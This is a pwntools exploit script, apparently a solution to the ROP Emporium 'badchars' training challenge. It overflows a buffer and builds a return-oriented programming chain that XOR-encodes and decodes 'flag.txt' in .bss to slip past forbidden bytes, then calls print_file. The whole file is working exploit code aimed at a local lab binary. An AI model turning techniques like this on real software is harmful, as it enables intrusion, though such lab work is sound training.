#!/usr/bin/python3
from pwn import *
gs = '''
break *0x400634
continue
'''
elf = context.binary = ELF('./badchars')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./badchars', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./badchars')
r = start()
#========= exploit here ===================
badchars = ['x', 'g', 'a', '.'] #0x78 0x67 0x61 2e
bss = 0x601038
print_file = 0x400620
pordi = 0x4006a3
pop_r12_ = 0x40069c #pop r12; pop r13; pop r14; pop r15; ret;
movr13 = 0x400634
pop_r14 = 0x4006a0
xor_r14r15 = 0x400628

string = []
for i in "flag.txt":
    a = xor(i, 0x40)
    string.append(a)
string = "".join(string)
#loop to write all bytes
def writer(i):    
    payload = p64(pop_r14)
    payload += p64(0x40)
    payload += p64(bss+i)
    payload += p64(xor_r14r15)
    return payload
payload = "A"*40
#gadget 1
payload += p64(0x40069c) #pop r12
payload += string
payload += p64(bss)
payload += p64(0)
payload += p64(0)
payload += p64(0x400634)
#gadget 2 wirtes flag.txt in bss 
payload += writer(0)
payload += writer(1)
payload += writer(2)
payload += writer(3)
payload += writer(4)
payload += writer(5)
payload += writer(6)
payload += writer(7)
#gadget3 
payload += p64(pordi)
payload += p64(bss)
payload += p64(print_file)


payload 

r.sendlineafter(">",payload)
#========= interactive ====================
r.interactive()
